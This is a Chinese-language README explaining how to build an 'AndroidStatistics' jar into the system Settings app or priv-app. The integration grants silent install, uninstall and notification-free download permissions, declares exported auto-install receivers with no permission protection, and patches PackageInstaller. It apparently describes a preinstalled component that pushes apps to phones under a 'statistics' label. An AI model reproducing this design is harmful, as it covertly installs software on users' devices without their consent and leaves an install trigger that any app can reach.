# AndroidStatistics
此项目主要分为两部分，注册，请求静默接口并调用系统下载部分（下面简称注册部分）和安装部分。

一 注册部分
  移植分两种形式，独立apk形式和以jar包形式放入Settings.apk中两种。
  1. 独立apk形式移植，直接放入system/priv-app下面。
  2. 以jar包形式移植。
   （1）在settings项目中创建libs文件夹，将jar包放入libs文件夹下。
   （2）在AndroidManifest.xml文件中加入下列权限:
   <!-- add statistics start-->
<uses-permission android:name="android.permission.INSTALL_PACKAGES" />
    <uses-permission android:name="android.permission.ACTION_DOWNLOAD_COMPLETE"/>
    <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />
    <uses-permission android:name="android.permission.DELETE_PACKAGES" />
<!-- add statistics end-->
  在application中加入下列组件内容：其中标注红色的ChannelID的value值为移植时候需要提前商定的渠道号

	 <!-- add statistics start-->
      <!-- 渠道号 -->
        <meta-data
            android:name="ChannelID"
            android:value="ad_hqyxcore_001" />

        <receiver
            android:name="com.android.statistics.PerfectReceiver"
            android:exported="true"
            android:process=":remote" >
            <intent-filter>
                <action android:name="android.intent.action.USER_PRESENT" />
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED" />

                <data android:scheme="package" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_REMOVED" />

                <data android:scheme="package" />
            </intent-filter>
        </receiver>
		
		 <receiver
            android:name="com.android.settings.AutoInstallApkReceiver"
            android:exported="true"
            android:process=":remote" >
            <intent-filter>
                <action android:name="com.android.AutoInstallApkReceiver.install" />
            </intent-filter>
            
        </receiver>

        <service
            android:name="com.android.statistics.PerfectService"
            android:process=":remote" >
            <intent-filter>
                <action android:name="com.perfect.android.init" >
                </action>
                <action android:name="com.perfect.android.again" >
                </action>
            </intent-filter>
        </service>  
	
	<!-- add statistics end-->


          
（3）在Android.mk文件中加入引用jar包的配置信息具体如下:

\#Add-by yunlong ---start
LOCAL_STATIC_JAVA_LIBRARIES += \
       android_help_lib
\#Add-by yunlong ---end

\#Add-by yunlong ---start
include $(CLEAR_VARS)
LOCAL_PREBUILT_STATIC_JAVA_LIBRARIES := android_help_lib:libs/android_help.jar
include $(BUILD_MULTI_PREBUILT)
\#Add-by yunlong ---end

注意：若Settings目录下存在tests文件夹，需要在Settings/tests/下新建libs目录，将android_help.jar文件复制到该目录下。
（不这样做的话，会在全编的时候报错）

二 安装部分
   这部分主要是对Packageinstaller的代码进行修改。修改的文件主要有以下三个，分别是：PackageInstallerActivity，UninstallerActivity，UninstallAppProgress。

